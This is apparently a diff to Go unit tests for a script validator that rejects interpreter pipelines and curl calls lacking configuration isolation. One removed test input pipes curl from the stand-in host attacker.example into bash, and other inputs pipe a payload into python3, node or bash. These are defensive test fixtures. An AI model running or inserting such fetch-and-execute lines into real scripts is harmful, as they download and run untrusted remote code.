@@ -299,7 +299,6 @@ func TestValidateScriptAssetAllowsSystemOwnedInputRedirection(t *testing.T) {
 
 func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
 	for _, script := range []string{
-		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /bin/bash\n",
 		"#!/bin/bash\n/usr/bin/printf payload | command /usr/bin/env SAFE=1 python3\n",
 		"#!/bin/bash\n/usr/bin/printf payload | { /usr/bin/node; }\n",
 		"#!/bin/bash\n/usr/bin/printf payload | /usr/bin/nohup /bin/bash\n",
@@ -310,6 +309,13 @@ func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
 			!strings.Contains(err.Error(), "interpreter pipeline") {
 			t.Fatalf("validateScriptAsset(%q) error = %v, want interpreter-pipeline rejection", script, err)
 		}
+	}
+}
+
+func TestValidateScriptAssetRejectsCurlUserConfiguration(t *testing.T) {
+	const script = "#!/bin/bash\n/usr/bin/curl https://attacker.example\n"
+	if err := validateScriptAsset([]byte(script)); err == nil {
+		t.Fatal("validateScriptAsset accepted curl without configuration isolation")
 	}
 }
 
